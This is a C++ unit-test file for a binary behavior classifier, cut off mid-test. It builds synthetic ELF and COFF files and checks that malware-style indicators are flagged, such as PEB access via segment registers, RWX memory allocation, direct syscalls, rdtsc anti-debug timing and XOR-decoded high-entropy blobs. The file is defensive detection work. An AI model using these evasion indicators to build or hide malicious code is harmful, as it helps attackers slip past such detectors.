#include "tools/traceql/aggregator/project_aggregator.h"
#include "tools/traceql/analysis/behavior_classifier.h"
#include "third_party/concurrentqueue/concurrentqueue.h"
#include "tools/traceql/analysis/dataset_loader.h"
#include "../optimize/entropy_analyzer.h"
#include "../base/fast_containers.h"
#include "../base/fixpoint_solver.h"
#include "../safety/points_to.h"
#include "../safety/taint_tracker.h"
#include "tools/traceql/ir/ir_asm_classifier.h"
#include "tools/traceql/patterns/behavior_rule_emitter.h"
#include "tools/traceql/patterns/call_pattern.h"
#include "tools/traceql/platform/header_classifier.h"
#include "tools/traceql/symbols/binary_symbol_parser.h"
#include "tools/traceql/symbols/remote_symbol_resolver.h"

#include <algorithm>
#include <array>
#include <cstdint>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <gtest/gtest.h>
#include <string>
#include <vector>

namespace traceql::test {

    namespace {

        bool hasTag(const std::vector<std::string> &tags, std::string_view expected) {
            return std::find(tags.begin(), tags.end(), expected) != tags.end();
        }

        template <typename T> void writeStruct(std::ofstream &out, const T &val) {
            out.write(reinterpret_cast<const char *>(&val), sizeof(T));
        }

        struct TestElf32Hdr {
            uint8_t e_ident[16]{};
            uint16_t e_type = 3; // ET_DYN
            uint16_t e_machine = 3;
            uint32_t e_version = 1;
            uint32_t e_entry = 0;
            uint32_t e_phoff = 0;
            uint32_t e_shoff = 0;
            uint32_t e_flags = 0;
            uint16_t e_ehsize = 52;
            uint16_t e_phentsize = 0;
            uint16_t e_phnum = 0;
            uint16_t e_shentsize = 40;
            uint16_t e_shnum = 0;
            uint16_t e_shstrndx = 0;
        };

        struct TestElf32Shdr {
            uint32_t sh_name = 0;
            uint32_t sh_type = 0;
            uint32_t sh_flags = 0;
            uint32_t sh_addr = 0;
            uint32_t sh_offset = 0;
            uint32_t sh_size = 0;
            uint32_t sh_link = 0;
            uint32_t sh_info = 0;
            uint32_t sh_addralign = 0;
            uint32_t sh_entsize = 0;
        };

        struct TestElf32Sym {
            uint32_t st_name = 0;
            uint32_t st_value = 0;
            uint32_t st_size = 0;
            uint8_t st_info = 0;
            uint8_t st_other = 0;
            uint16_t st_shndx = 0;
        };

        struct TestElf32Dyn {
            int32_t d_tag = 0;
            uint32_t d_val = 0;
        };

        struct TestElf64Hdr {
            uint8_t e_ident[16]{};
            uint16_t e_type = 3; // ET_DYN
            uint16_t e_machine = 62;
            uint32_t e_version = 1;
            uint64_t e_entry = 0;
            uint64_t e_phoff = 0;
            uint64_t e_shoff = 0;
            uint32_t e_flags = 0;
            uint16_t e_ehsize = 64;
            uint16_t e_phentsize = 0;
            uint16_t e_phnum = 0;
            uint16_t e_shentsize = 64;
            uint16_t e_shnum = 0;
            uint16_t e_shstrndx = 0;
        };

        struct TestElf64Shdr {
            uint32_t sh_name = 0;
            uint32_t sh_type = 0;
            uint64_t sh_flags = 0;
            uint64_t sh_addr = 0;
            uint64_t sh_offset = 0;
            uint64_t sh_size = 0;
            uint32_t sh_link = 0;
            uint32_t sh_info = 0;
            uint64_t sh_addralign = 0;
            uint64_t sh_entsize = 0;
        };

        struct TestElf64Sym {
            uint32_t st_name = 0;
            uint8_t st_info = 0;
            uint8_t st_other = 0;
            uint16_t st_shndx = 0;
            uint64_t st_value = 0;
            uint64_t st_size = 0;
        };

        struct TestElf64Dyn {
            int64_t d_tag = 0;
            uint64_t d_val = 0;
        };

        template <typename Hdr, typename Shdr, typename Sym, typename Dyn>
        void writeSyntheticElf(const std::filesystem::path &path, uint8_t elf_class, const std::string &soname,
                               const std::string &symbol_name) {
            std::string strtab;
            strtab.push_back('\0');
            const uint32_t soname_off = static_cast<uint32_t>(strtab.size());
            strtab += soname;
            strtab.push_back('\0');
            const uint32_t sym_off = static_cast<uint32_t>(strtab.size());
            strtab += symbol_name;
            strtab.push_back('\0');

            std::array<Sym, 2> syms{};
            syms[1].st_name = sym_off;
            syms[1].st_info = static_cast<uint8_t>((1u << 4) | 2u); // STB_GLOBAL | STT_FUNC
            syms[1].st_shndx = 1;

            std::array<Dyn, 2> dyns{};
            dyns[0].d_tag = 14; // DT_SONAME
            dyns[0].d_val = soname_off;
            dyns[1].d_tag = 0; // DT_NULL
            dyns[1].d_val = 0;

            const uint32_t strtab_offset = sizeof(Hdr);
            const uint32_t dynsym_offset = strtab_offset + static_cast<uint32_t>(strtab.size());
            const uint32_t dynamic_offset = dynsym_offset + static_cast<uint32_t>(sizeof(syms));
            const uint32_t shoff = dynamic_offset + static_cast<uint32_t>(sizeof(dyns));

            Hdr hdr{};
            hdr.e_ident[0] = 0x7F;
            hdr.e_ident[1] = 'E';
            hdr.e_ident[2] = 'L';
            hdr.e_ident[3] = 'F';
            hdr.e_ident[4] = elf_class;
            hdr.e_ident[5] = 1; // ELFDATA2LSB
            hdr.e_ident[6] = 1; // EV_CURRENT
            hdr.e_shoff = shoff;
            hdr.e_shnum = 4;

            std::array<Shdr, 4> shdrs{};
            // Section 1: SHT_STRTAB (3)
            shdrs[1].sh_type = 3;
            shdrs[1].sh_offset = strtab_offset;
            shdrs[1].sh_size = strtab.size();
            // Section 2: SHT_DYNSYM (11)
            shdrs[2].sh_type = 11;
            shdrs[2].sh_offset = dynsym_offset;
            shdrs[2].sh_size = sizeof(syms);
            shdrs[2].sh_link = 1;
            shdrs[2].sh_entsize = sizeof(Sym);
            // Section 3: SHT_DYNAMIC (6)
            shdrs[3].sh_type = 6;
            shdrs[3].sh_offset = dynamic_offset;
            shdrs[3].sh_size = sizeof(dyns);
            shdrs[3].sh_link = 1;
            shdrs[3].sh_entsize = sizeof(Dyn);

            std::ofstream out(path, std::ios::binary | std::ios::trunc);
            writeStruct(out, hdr);
            out.write(strtab.data(), static_cast<std::streamsize>(strtab.size()));
            out.write(reinterpret_cast<const char *>(syms.data()), sizeof(syms));
            out.write(reinterpret_cast<const char *>(dyns.data()), sizeof(dyns));
            out.write(reinterpret_cast<const char *>(shdrs.data()), sizeof(shdrs));
        }

#pragma pack(push, 1)
        struct TestArchiveMemberHeader {
            char Name[16];
            char Date[12];
            char UserID[6];
            char GroupID[6];
            char Mode[8];
            char Size[10];
            char EndHeader[2];
        };

        struct TestCoffShortImportHeader {
            uint16_t Sig1;
            uint16_t Sig2;
            uint16_t Version;
            uint16_t Machine;
            uint32_t TimeDateStamp;
            uint32_t SizeOfData;
            uint16_t OrdinalOrHint;
            uint16_t TypeInfo;
        };
#pragma pack(pop)

        void writeSyntheticCoffImportLib(const std::filesystem::path &path, const std::string &symbol_name,
                                         const std::string &dll_name) {
            std::string payload = symbol_name;
            payload.push_back('\0');
            payload += dll_name;
            payload.push_back('\0');

            const size_t member_size = sizeof(TestCoffShortImportHeader) + payload.size();

            TestArchiveMemberHeader ar{};
            std::memset(&ar, ' ', sizeof(ar));
            const std::string mem_name = dll_name + "/";
            std::memcpy(ar.Name, mem_name.data(), std::min(mem_name.size(), sizeof(ar.Name)));
            const std::string size_str = std::to_string(member_size);
            std::memcpy(ar.Size, size_str.data(), std::min(size_str.size(), sizeof(ar.Size)));
            ar.EndHeader[0] = '`';
            ar.EndHeader[1] = '\n';

            TestCoffShortImportHeader imp{};
            imp.Sig1 = 0x0000;
            imp.Sig2 = 0xFFFF;
            imp.Version = 0;
            imp.Machine = 0x8664; // AMD64
            imp.SizeOfData = static_cast<uint32_t>(payload.size());
            imp.TypeInfo = static_cast<uint16_t>(2u << 2); // IMPORT_NAME_NOPREFIX

            std::ofstream out(path, std::ios::binary | std::ios::trunc);
            out.write("!<arch>\n", 8);
            writeStruct(out, ar);
            writeStruct(out, imp);
            out.write(payload.data(), static_cast<std::streamsize>(payload.size()));
            if ((member_size % 2) != 0) {
                out.put('\n');
            }
        }

    } // namespace

    // ===========================================================================
    // Existing Tests (Preserved)
    // ===========================================================================

    TEST(HeaderClassifierTest, ExtractsPlatformAndModuleHintWithoutHardcodedLibs) {
        auto linux_math = classifyHeaderPath("/usr/include/math.h", TargetPlatform::Linux_Glibc);
        EXPECT_TRUE(linux_math.is_system_path);
        EXPECT_EQ(linux_math.platform, TargetPlatform::Linux_Glibc);
        EXPECT_EQ(linux_math.module_hint, "math.h");

        auto linux_x11 = classifyHeaderPath("/usr/include/X11/Xlib.h");
        EXPECT_TRUE(linux_x11.is_system_path);
        EXPECT_EQ(linux_x11.platform, TargetPlatform::Linux_Glibc);
        EXPECT_EQ(linux_x11.module_hint, "X11");

        auto linux_cxx = classifyHeaderPath("/usr/include/c++/16/bits/basic_string.h");
        EXPECT_TRUE(linux_cxx.is_system_path);
        EXPECT_EQ(linux_cxx.module_hint, "c++");

        auto android_log = classifyHeaderPath(
            "/opt/android-ndk/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/include/android/log.h");
        EXPECT_TRUE(android_log.is_system_path);
        EXPECT_EQ(android_log.platform, TargetPlatform::Android_Bionic);
        EXPECT_EQ(android_log.module_hint, "android");

        auto win_um =
            classifyHeaderPath("C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.22621.0\\um\\memoryapi.h");
        EXPECT_TRUE(win_um.is_system_path);
        EXPECT_EQ(win_um.platform, TargetPlatform::Windows_MSVC_UCRT);
        EXPECT_EQ(win_um.module_hint, "um");
    }

    TEST(BinarySymbolParserTest, DynamicallyParsesRealSharedObjectsWithoutHardcoding) {
        auto &reg = DynamicSymbolRegistry::instance();
        reg.clear();

        const std::string libz_path = "/usr/lib64/libz.so.1";
        if (std::filesystem::exists(libz_path)) {
            EXPECT_TRUE(reg.loadLibrary(libz_path));
            EXPECT_GT(reg.totalSymbolCount(), 50u);
            EXPECT_FALSE(reg.findLibraryForSymbol("deflate").empty());
            EXPECT_FALSE(reg.findLibraryForSymbol("inflate").empty());
            EXPECT_FALSE(reg.findLibraryForSymbol("crc32").empty());
        }

        reg.registerSymbol("custom_game_engine_init", "libgame.so");
        EXPECT_EQ(reg.findLibraryForSymbol("custom_game_engine_init"), "libgame.so");
    }

    TEST(RemoteSymbolResolverTest, ManifestFileAndUrlFormatting) {
        auto &resolver = RemoteSymbolResolver::instance();
        const std::string tmp_manifest = "/tmp/test_symbols.manifest";
        {
            std::ofstream out(tmp_manifest);
            out << "# Custom symbol manifest\n";
            out << "vkCreateInstance libvulkan.so.1\n";
            out << "curl_easy_init libcurl.so.4\n";
        }

        EXPECT_GT(resolver.loadManifestFile(tmp_manifest), 0u);
        EXPECT_EQ(resolver.lookup("vkCreateInstance"), "libvulkan.so.1");
        EXPECT_EQ(resolver.lookup("curl_easy_init"), "libcurl.so.4");

        std::string url = resolver.formatOnlineLookupUrl("some_rare_proprietary_func");
        EXPECT_NE(url.find("some_rare_proprietary_func"), std::string::npos);

        std::filesystem::remove(tmp_manifest);
    }

    TEST(CallPatternTest, FormatsSignatureCanonicalPatternAndBehaviorSequences) {
        CallPatternRecord rec;
        rec.caller_function = "computeAngle";
        rec.symbol = "sin";
        rec.mangled_symbol = "sin";
        rec.library = "libm.so.6";
        rec.category = "Math";
        rec.kind = "call";
        rec.return_type = "double";
        rec.param_types = {"double"};
        rec.arg_shapes = {"lit:double"};
        rec.all_args_constant = true;
        rec.source_file = "test.cpp";
        rec.line = 12;
        rec.column = 14;

        EXPECT_EQ(rec.formatSignature(), "double sin(double)");
        EXPECT_EQ(rec.formatCanonicalPattern(), "[libm.so.6] double sin(double) @ (lit:double)");

        CallPatternCollector collector;
        collector.add(rec);
        const auto seqs = collector.buildSequences();
        ASSERT_EQ(seqs.size(), 1u);
        EXPECT_EQ(seqs[0].caller_function, "computeAngle");
        ASSERT_EQ(seqs[0].call_patterns.size(), 1u);

        const std::string json = collector.toJson();
        EXPECT_NE(json.find("\"caller\": \"computeAngle\""), std::string::npos);
        EXPECT_NE(json.find("\"pattern\": \"[libm.so.6] double sin(double) @ (lit:double)\""), std::string::npos);
        EXPECT_NE(json.find("\"sequences\""), std::string::npos);
    }

    // ===========================================================================
    // 1. EntropyAnalyzerTest
    // ===========================================================================

    TEST(EntropyAnalyzerTest, ComputesShannonEntropyForRepeatingAndHighEntropyStrings) {
        EXPECT_DOUBLE_EQ(EntropyAnalyzer::computeShannonEntropy(""), 0.0);
        EXPECT_DOUBLE_EQ(EntropyAnalyzer::computeShannonEntropy("AAAAAAAAAAAAAAAAAAAAAAAAAAAA"), 0.0);

        const double low_ent = EntropyAnalyzer::computeShannonEntropy("aaaaabbbbb");
        EXPECT_NEAR(low_ent, 1.0, 1e-6);

        const std::string high_ent_str = "aB3$kL9!mZ7@qW2#xP8^vN4&cR6*tY1(uJ5)hF0_dG+sE-wQ=zX/nM<bV>cK?pL";
        const double high_ent = EntropyAnalyzer::computeShannonEntropy(high_ent_str);
        EXPECT_GT(high_ent, 5.5);
        EXPECT_LE(high_ent, 8.0);
    }

    TEST(EntropyAnalyzerTest, ComputesByteArrayEntropy) {
        EXPECT_DOUBLE_EQ(EntropyAnalyzer::computeByteEntropy(nullptr, 16), 0.0);

        std::array<uint8_t, 32> zeros{};
        EXPECT_DOUBLE_EQ(EntropyAnalyzer::computeByteEntropy(zeros.data(), zeros.size()), 0.0);

        std::array<uint8_t, 256> uniform{};
        for (size_t i = 0; i < uniform.size(); ++i) {
            uniform[i] = static_cast<uint8_t>(i);
        }
        EXPECT_NEAR(EntropyAnalyzer::computeByteEntropy(uniform.data(), uniform.size()), 8.0, 1e-6);
    }

    TEST(EntropyAnalyzerTest, ComputesSequenceEntropy) {
        EXPECT_DOUBLE_EQ(EntropyAnalyzer::computeSequenceEntropy({}), 0.0);
        EXPECT_DOUBLE_EQ(EntropyAnalyzer::computeSequenceEntropy({"sin", "sin", "sin"}), 0.0);

        const double diverse = EntropyAnalyzer::computeSequenceEntropy({"a", "b", "c", "d"});
        EXPECT_NEAR(diverse, 2.0, 1e-6);
    }

    TEST(EntropyAnalyzerTest, DetectsHighEntropyStringsAndBytesWithLengthGuards) {
        EXPECT_FALSE(EntropyAnalyzer::isHighEntropyString("aB3$kL9!mZ", 4.5, 12));
        EXPECT_FALSE(EntropyAnalyzer::isHighEntropyString("aaaaaaaaaaaaaaaaaaaa", 4.5, 12));
        // Pure printable ASCII (even 36 chars, ~5.1 bits/byte) must NOT trigger encrypted-blob detection.
        EXPECT_FALSE(EntropyAnalyzer::isHighEntropyString("aB3$kL9!mZ7@qW2#xP8^vN4&cR6*tY1(uJ5)"));

        // Real binary/packed buffer >= 32 bytes with non-printable bytes & high entropy triggers.
        std::array<uint8_t, 64> packed_bytes{};
        for (size_t i = 0; i < packed_bytes.size(); ++i) {
            packed_bytes[i] = static_cast<uint8_t>((i * 73u + 19u) & 0xFFu);
        }
        EXPECT_FALSE(EntropyAnalyzer::isHighEntropyBytes(nullptr, 32));
        EXPECT_FALSE(EntropyAnalyzer::isHighEntropyBytes(packed_bytes.data(), 8, 6.8, 32));
        EXPECT_TRUE(EntropyAnalyzer::isLikelyEncryptedOrPacked(packed_bytes.data(), packed_bytes.size(), 5.8, 32));

        std::array<uint8_t, 32> repeating{};
        repeating.fill(0xAA);
        EXPECT_FALSE(EntropyAnalyzer::isHighEntropyBytes(repeating.data(), repeating.size(), 6.8, 32));
    }

    TEST(EntropyAnalyzerTest, RejectsNormalAsciiAndEmbeddedBitmapAssets) {
        // Normal UI/graphics strings and embedded 5.7-bit/byte textures must score 0 (Benign).
        BehaviorFeatures ui_str;
        ui_str.call_kind = "direct";
        ui_str.return_type = "void";
        ui_str.param_types = {"const char*"};
        ui_str.string_literals = {"forma/resources/shaders/sdf_rounded_rect.frag"};
        ui_str.arg_entropies = {4.85};
        ui_str.max_arg_entropy = 4.85;
        const auto ui_res = BehaviorClassifier::classify(ui_str);
        EXPECT_EQ(ui_res.primary_category, BehaviorCategory::Benign);
        EXPECT_EQ(ui_res.risk_score, 0u);

        BehaviorFeatures bitmap_blob;
        bitmap_blob.call_kind = "high_entropy_bytes";
        bitmap_blob.return_type = "const unsigned char[1024]";
        bitmap_blob.arg_entropies = {5.70};
        bitmap_blob.max_arg_entropy = 5.70;
        const auto bmp_res = BehaviorClassifier::classify(bitmap_blob);
        EXPECT_EQ(bmp_res.primary_category, BehaviorCategory::Benign);
        EXPECT_EQ(bmp_res.risk_score, 0u);
    }

    TEST(EntropyAnalyzerTest, SummarizesLiteralAndSequenceEntropies) {
        const auto empty_report = EntropyAnalyzer::summarize({}, {}, 4.5);
        EXPECT_DOUBLE_EQ(empty_report.max_literal_entropy, 0.0);
        EXPECT_DOUBLE_EQ(empty_report.mean_literal_entropy, 0.0);
        EXPECT_DOUBLE_EQ(empty_report.sequence_entropy, 0.0);
        EXPECT_EQ(empty_report.high_entropy_blob_count, 0u);

        const auto report = EntropyAnalyzer::summarize({1.2, 5.1, 6.8}, {"alloc", "protect", "exec", "alloc"}, 4.5);
        EXPECT_DOUBLE_EQ(report.max_literal_entropy, 6.8);
        EXPECT_NEAR(report.mean_literal_entropy, (1.2 + 5.1 + 6.8) / 3.0, 1e-6);
        EXPECT_EQ(report.high_entropy_blob_count, 2u);
        EXPECT_NEAR(report.sequence_entropy, 1.5, 1e-6);
    }

    // ===========================================================================
    // 2. BehaviorClassifierTest
    // ===========================================================================

    TEST(BehaviorClassifierTest, ClassifiesDynamicResolutionPatterns) {
        // 2-arg resolver: (void*, const char*) -> void*
        BehaviorFeatures resolver_sig;
        resolver_sig.call_kind = "direct";
        resolver_sig.return_type = "void*";
        resolver_sig.param_types = {"void*", "const char*"};
        const auto resolver_res = BehaviorClassifier::classify(resolver_sig);
        EXPECT_EQ(resolver_res.primary_category, BehaviorCategory::DynamicResolution);
        EXPECT_TRUE(hasTag(resolver_res.tags, "dynamic_symbol_lookup"));
        EXPECT_TRUE(hasTag(resolver_res.tags, "iat_evasion"));
        EXPECT_GE(resolver_res.risk_score, 68u);

        // Function pointer cast
        BehaviorFeatures fn_cast;
        fn_cast.call_kind = "fn_ptr_cast";
        const auto cast_res = BehaviorClassifier::classify(fn_cast);
        EXPECT_EQ(cast_res.primary_category, BehaviorCategory::DynamicResolution);
        EXPECT_TRUE(hasTag(cast_res.tags, "fn_ptr_cast"));
        EXPECT_TRUE(hasTag(cast_res.tags, "dynamic_resolution"));

        // Segment register PEB/TEB access (gs: / fs:)
        BehaviorFeatures gs_access;
        gs_access.target_os = TargetOS::Windows;
        gs_access.call_kind = "inline_asm";
        gs_access.asm_text = "mov rax, gs:[0x60]";
        const auto gs_res = BehaviorClassifier::classify(gs_access);
        EXPECT_EQ(gs_res.primary_category, BehaviorCategory::DynamicResolution);
        EXPECT_TRUE(hasTag(gs_res.tags, "peb_teb_access"));
        EXPECT_TRUE(hasTag(gs_res.tags, "iat_evasion"));

        BehaviorFeatures fs_access;
        fs_access.target_os = TargetOS::Windows;
        fs_access.call_kind = "inline_asm";
        fs_access.asm_text = "mov eax, fs:[0x30]";
        const auto fs_res = BehaviorClassifier::classify(fs_access);
        EXPECT_EQ(fs_res.primary_category, BehaviorCategory::DynamicResolution);
        EXPECT_TRUE(hasTag(fs_res.tags, "peb_teb_access"));
    }

    TEST(BehaviorClassifierTest, ClassifiesMemoryAllocationAndProtectionWithRwxMasks) {
        // Virtual allocation with Windows RWX constant 0x40
        BehaviorFeatures win_alloc;
        win_alloc.target_os = TargetOS::Windows;
        win_alloc.call_kind = "direct";
        win_alloc.return_type = "void*";
        win_alloc.param_types = {"void*", "size_t", "DWORD", "DWORD"};
        win_alloc.numeric_constants = {0x3000ULL, 0x40ULL};
        const auto alloc_res = BehaviorClassifier::classify(win_alloc);
        EXPECT_EQ(alloc_res.primary_category, BehaviorCategory::MemoryAllocation);
        EXPECT_TRUE(hasTag(alloc_res.tags, "virtual_memory_allocation"));
        EXPECT_TRUE(hasTag(alloc_res.tags, "rwx_violation"));
        EXPECT_GE(alloc_res.risk_score, 86u);

        // POSIX memory protection: (void*, size_t, int) -> int with PROT_WRITE|PROT_EXEC (0x06)
        BehaviorFeatures posix_prot;
        posix_prot.target_os = TargetOS::Linux;
        posix_prot.call_kind = "direct";
        posix_prot.return_type = "int";
        posix_prot.param_types = {"void*", "size_t", "int"};
        posix_prot.numeric_constants = {0x06ULL};
        const auto prot_res = BehaviorClassifier::classify(posix_prot);
        EXPECT_EQ(prot_res.primary_category, BehaviorCategory::MemoryProtection);
        EXPECT_TRUE(hasTag(prot_res.tags, "memory_protection"));
        EXPECT_TRUE(hasTag(prot_res.tags, "rwx_violation"));
        EXPECT_TRUE(hasTag(prot_res.tags, "wx_violation"));
        EXPECT_GE(prot_res.risk_score, 86u);
    }

    TEST(BehaviorClassifierTest, ClassifiesDirectSyscallsAcrossArchitectures) {
        BehaviorFeatures x64_syscall;
        x64_syscall.target_os = TargetOS::Linux;
        x64_syscall.call_kind = "inline_asm";
        x64_syscall.asm_text = "syscall";
        const auto x64_res = BehaviorClassifier::classify(x64_syscall);
        EXPECT_EQ(x64_res.primary_category, BehaviorCategory::DirectSyscall);
        EXPECT_TRUE(hasTag(x64_res.tags, "direct_syscall"));
        EXPECT_TRUE(hasTag(x64_res.tags, "x86_64_syscall"));
        EXPECT_GE(x64_res.risk_score, 88u);

        BehaviorFeatures arm_svc;
        arm_svc.target_os = TargetOS::Android;
        arm_svc.call_kind = "inline_asm";
        arm_svc.asm_text = "svc #0";
        const auto arm_res = BehaviorClassifier::classify(arm_svc);
        EXPECT_EQ(arm_res.primary_category, BehaviorCategory::DirectSyscall);
        EXPECT_TRUE(hasTag(arm_res.tags, "arm_svc_syscall"));
        EXPECT_GE(arm_res.risk_score, 90u);

        BehaviorFeatures x86_int;
        x86_int.target_os = TargetOS::Linux;
        x86_int.call_kind = "inline_asm";
        x86_int.asm_text = "int 0x80";
        const auto int_res = BehaviorClassifier::classify(x86_int);
        EXPECT_EQ(int_res.primary_category, BehaviorCategory::DirectSyscall);
        EXPECT_TRUE(hasTag(int_res.tags, "x86_int_syscall"));
    }

    TEST(BehaviorClassifierTest, ClassifiesAntiDebugObfuscatedIndirectAndBenign) {
        // AntiDebugOrTiming via rdtsc
        BehaviorFeatures rdtsc;
        rdtsc.call_kind = "inline_asm";
        rdtsc.asm_text = "rdtsc";
        const auto rdtsc_res = BehaviorClassifier::classify(rdtsc);
        EXPECT_EQ(rdtsc_res.primary_category, BehaviorCategory::AntiDebugOrTiming);
        EXPECT_TRUE(hasTag(rdtsc_res.tags, "rdtsc_timing"));
        EXPECT_TRUE(hasTag(rdtsc_res.tags, "anti_debug"));

        // ObfuscatedPayload: high-entropy literal + XOR decoding loop
        BehaviorFeatures obf;
        obf.call_kind = "direct";
        obf.return_type = "void";
        obf.param_types = {"uint8_t*", "size_t"};
        obf.has_high_entropy_literal = true;
        obf.max_arg_entropy = 6.9;
        obf.has_bitwise_xor_loop = true;
        const auto obf_res = BehaviorClassifier::classify(obf);
        EXPECT_EQ(obf_res.primary_category, BehaviorCategory::ObfuscatedPayload);
        EXPECT_TRUE(hasTag(obf_res.tags, "xor_decoding_loop"));
        EXPECT_TRUE(hasTag(obf_res.tags, "high_entropy_literal"));
        EXPECT_TRUE(hasTag(obf_res.tags, "encrypted_or_packed_blob"));
        EXPECT_GE(obf_res.risk_score, 80u);

        // IndirectCall with resolved_from_symbol
        BehaviorFeatures indirect;
        indirect.call_kind = "indirect";
        indirect.return_type = "int";
        indirect.resolved_from_symbol = true;
        const auto ind_res = BehaviorClassifier::classify(indirect);
        EXPECT_EQ(ind_res.primary_category, BehaviorCategory::IndirectCall);
        EXPECT_TRUE(hasTag(ind_res.tags, "indirect_call"));
        EXPECT_TRUE(hasTag(ind_res.tags, "resolved_symbol_invocation"));
        EXPECT_GE(ind_res.risk_score, 70u);

        // Benign normal call
        BehaviorFeatures benign;
        benign.call_kind = "direct";
        benign.return_type = "double";
        benign.param_types = {"double"};
        benign.is_system_header = true;
        const auto benign_res = BehaviorClassifier::classify(benign);
        EXPECT_EQ(benign_res.primary_category, BehaviorCategory::Benign);
        EXPECT_EQ(benign_res.risk_score, 0u);
    }

    TEST(BehaviorClassifierTest, AvoidsFalsePositivesOnStandardCppPatterns) {
        // snprintf(char*, size_t, const char*, ...) -> int
        BehaviorFeatures snprintf_feat;
        snprintf_feat.call_kind = "direct";
        snprintf_feat.return_type = "int";
        snprintf_feat.param_types = {"char*", "size_t", "const char*"};
        snprintf_feat.is_variadic = true;
        snprintf_feat.is_system_header = true;
        const auto snprintf_res = BehaviorClassifier::classify(snprintf_feat);
        EXPECT_EQ(snprintf_res.primary_category, BehaviorCategory::Benign);
        EXPECT_EQ(snprintf_res.risk_score, 0u);

        // memcpy(void*, const void*, size_t) -> void*
        BehaviorFeatures memcpy_feat;
        memcpy_feat.call_kind = "direct";
        memcpy_feat.return_type = "void*";
        memcpy_feat.param_types = {"void*", "const void*", "size_t"};
        memcpy_feat.is_system_header = true;
        const auto memcpy_res = BehaviorClassifier::classify(memcpy_feat);
        EXPECT_EQ(memcpy_res.primary_category, BehaviorCategory::Benign);
        EXPECT_EQ(memcpy_res.risk_score, 0u);

        // qsort(void*, size_t, size_t, int(*)(const void*, const void*)) -> void
        BehaviorFeatures qsort_feat;
        qsort_feat.call_kind = "direct";
        qsort_feat.return_type = "void";
        qsort_feat.param_types = {"void*", "size_t", "size_t", "int (*)(const void*, const void*)"};
        qsort_feat.is_system_header = true;
        const auto qsort_res = BehaviorClassifier::classify(qsort_feat);
        EXPECT_EQ(qsort_res.primary_category, BehaviorCategory::Benign);
        EXPECT_EQ(qsort_res.risk_score, 0u);

        // operator new: low-risk heap allocation (below default risk threshold 40)
        BehaviorFeatures op_new;
        op_new.call_kind = "new";
        op_new.return_type = "void*";
        op_new.param_types = {"size_t"};
        op_new.is_system_header = true;
        const auto new_res = BehaviorClassifier::classify(op_new);
        EXPECT_EQ(new_res.primary_category, BehaviorCategory::MemoryAllocation);
        EXPECT_LT(new_res.risk_score, 40u);

        // lseek(int, off_t, int) with SEEK_END (2) must not false-positive as socket()
        BehaviorFeatures lseek_feat;
        lseek_feat.call_kind = "direct";
        lseek_feat.return_type = "off_t";
        lseek_feat.param_types = {"int", "off_t", "int"};
        lseek_feat.numeric_constants = {0ULL, 2ULL};
        lseek_feat.is_system_header = true;
        const auto lseek_res = BehaviorClassifier::classify(lseek_feat);
        EXPECT_EQ(lseek_res.primary_category, BehaviorCategory::Benign);

        // Real socket(AF_INET=2, SOCK_STREAM=1, 0) still detected
        BehaviorFeatures socket_feat;
        socket_feat.call_kind = "direct";
        socket_feat.return_type = "int";
        socket_feat.param_types = {"int", "int", "int"};
        socket_feat.numeric_constants = {2ULL, 1ULL, 0ULL};
        socket_feat.is_system_header = true;
        const auto socket_res = BehaviorClassifier::classify(socket_feat);
        EXPECT_EQ(socket_res.primary_category, BehaviorCategory::NetworkOrIPC);
        EXPECT_TRUE(hasTag(socket_res.tags, "socket_creation"));

        // Cast from nullptr_t to function pointer is benign
        BehaviorFeatures null_cast;
        null_cast.call_kind = "fn_ptr_cast";
        null_cast.param_types = {"std::nullptr_t"};
        const auto null_cast_res = BehaviorClassifier::classify(null_cast);
        EXPECT_EQ(null_cast_res.primary_category, BehaviorCategory::Benign);
    }

    // ===========================================================================
    // 3. HeaderClassifierTest (TargetOS & Cross-Platform Detection)
    // ===========================================================================

    TEST(HeaderClassifierTest, DetectsTargetOSForWindowsAndroidAndLinuxPaths) {
        const HeaderClassifier classifier;

        // Windows
        EXPECT_EQ(classifier.detectTargetOS(
                      "C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.22621.0\\ucrt\\stdio.h"),
                  TargetOS::Windows);
        EXPECT_EQ(classifier.detectTargetOS("/usr/x86_64-w64-mingw32/include/windows.h"), TargetOS::Windows);
        EXPECT_EQ(classifier.detectTargetOS("/sdk/ucrt/stdlib.h"), TargetOS::Windows);

        // Android
        EXPECT_EQ(classifier.detectTargetOS("/opt/android-ndk/sysroot/usr/include/android/log.h"), TargetOS::Android);
        EXPECT_EQ(classifier.detectTargetOS("/system/bionic/libc/include/unistd.h"), TargetOS::Android);
        EXPECT_EQ(classifier.detectTargetOS("/usr/aarch64-linux-android/include/stdio.h"), TargetOS::Android);

        // Linux
        EXPECT_EQ(classifier.detectTargetOS("/usr/include/x86_64-linux-gnu/sys/mman.h"), TargetOS::Linux);
        EXPECT_EQ(classifier.detectTargetOS("/opt/musl/include/unistd.h"), TargetOS::Linux);

        // Compiler triple overrides
        EXPECT_EQ(classifier.detectTargetOS("", "aarch64-linux-android"), TargetOS::Android);
        EXPECT_EQ(classifier.detectTargetOS("", "x86_64-pc-windows-msvc"), TargetOS::Windows);
        EXPECT_EQ(classifier.detectTargetOS("", "x86_64-linux-musl"), TargetOS::Linux);
    }

    // ===========================================================================
    // 4. BinarySymbolParserTest (ELF32/ELF64 & PE/COFF Import Libs)
    // ===========================================================================

    TEST(BinarySymbolParserTest, DetectsElf32Elf64AndCoffImportLibFormats) {
        const auto tmp_dir = std::filesystem::temp_directory_path() / "traceql_test_bins";
        std::filesystem::create_directories(tmp_dir);

        const auto elf32_path = tmp_dir / "libtest32.so";
        const auto elf64_path = tmp_dir / "libtest64.so";
        const auto coff_path = tmp_dir / "kernel32_test.lib";

        writeSyntheticElf<TestElf32Hdr, TestElf32Shdr, TestElf32Sym, TestElf32Dyn>(elf32_path, 1, "libtest32.so",
                                                                                   "elf32_exported_fn");
        writeSyntheticElf<TestElf64Hdr, TestElf64Shdr, TestElf64Sym, TestElf64Dyn>(elf64_path, 2, "libtest64.so",
                                                                                   "elf64_exported_fn");
        writeSyntheticCoffImportLib(coff_path, "VirtualProtect", "kernel32.dll");

        auto &reg = DynamicSymbolRegistry::instance();
        reg.clear();

        ASSERT_TRUE(reg.loadLibrary(elf32_path.string()));
        ASSERT_TRUE(reg.loadLibrary(elf64_path.string()));
        ASSERT_TRUE(reg.loadLibrary(coff_path.string()));

